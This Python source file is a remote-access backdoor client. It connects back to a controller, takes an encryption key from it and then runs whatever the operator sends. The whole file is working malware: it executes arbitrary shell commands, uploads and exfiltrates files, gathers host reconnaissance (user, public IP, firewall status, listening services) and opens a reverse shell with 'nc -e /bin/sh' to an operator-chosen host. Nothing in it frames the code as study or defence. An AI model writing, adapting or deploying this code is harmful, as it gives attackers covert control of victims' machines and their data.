import platform
import time
import importlib
import subprocess as sp
import socket
# list of the modules you have to install manually
imports = ["requests"]
try:
    for i in imports:
        globals()[i] = importlib.import_module(i)
except:
    for i in imports:
        sp.call(["pip3", "install", i])
    for i in imports:
        globals()[i] =  importlib.import_module(i)
import os
try:
    from cryptography.fernet import Fernet
except:
    os.system("pip install cryptography -q -U")
fernet = ""
HOST = "0.0.0.0"  # The server's hostname or IP address
PORT = 9999  # The port used by the server


def decrypt(data):
    return fernet.decrypt(data).decode()


def encrypt(data):
    return fernet.encrypt(data.encode())


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    while True:
        try:
            s.connect((HOST, PORT))
        except:
            time.sleep(1)
            continue
        key = s.recv(1024)
        fernet = Fernet(key)
        s.send(encrypt(platform.system()))
        while True:
            try:
                data = decrypt(s.recv(1024))
            except:
                break
            option, args = data.split(":")
            print(args)
            option = option.lower()
            if option == "cmd":
                s.send(encrypt(sp.getoutput(args)))
            elif option == "alive":
                s.send(encrypt("alive"))
            elif option == "check":
                s.send(encrypt("1"))
            elif option == "file-u":
                try:
                    file = s.recv(1024)
                    with open(args.split("|")[1], "wb") as f:
                        f.write(file)
                    s.send(encrypt("File Uploaded"))
                except Exception as e:
                    s.send(encrypt("!" + str(e)))
            elif option == "file-d":
                try:
                    with open(args, "rb") as f:
                        s.sendfile(f)
                except Exception as e:
                    s.send(encrypt("!" + str(e)))
            elif option == "content":
                try:
                    with open(args) as f:
                        s.send(encrypt(f.read()))
                except Exception as e:
                    s.send(encrypt("!" + str(e)))
            elif option == "infos":
                # Get System Infos
                infos = {}
                infos["hostname"] = sp.getoutput("hostname")
                try:
                    infos["remote_ip"] = requests.get("https://api.ipify.org").text
                except Exception as e:
                    infos["remote_ip"] = e
                infos["local_ip"] = socket.gethostbyname(socket.gethostname())
                infos["operating_system"] = sp.getoutput("uname -a")
                infos["processor"] = sp.getoutput("cat /proc/cpuinfo | grep 'model name' | head -1")
                infos["ram"] = sp.getoutput("cat /proc/meminfo | grep 'MemTotal' | awk '{print $2}'")
                infos["user"] = sp.getoutput("whoami")
                infos["python_version"] = sp.getoutput("python3 -V")
                infos["date"] = sp.getoutput("date")
                infos["firewall"] = sp.getoutput("ufw status")
                infos["sudo"] = sp.getoutput("sudo -V")
                infos["services"] = sp.getoutput("ss -tulpn")
                s.send(encrypt(str(infos)))
            elif option == "dir":
                # Get Directory
                try:
                    os.listdir(args)
                    s.send(encrypt(str(os.listdir()))) 
                except Exception as e:
                    s.send(encrypt("!" +str(e)))
            elif option == "exit":
                # clear everything
                exit()
            elif option == "shell":
                # open a shell
                sp.Popen(f"nc -e /bin/sh {args[0]} {args[1]}", shell=True)
                s.send(encrypt("Shell Opened"))

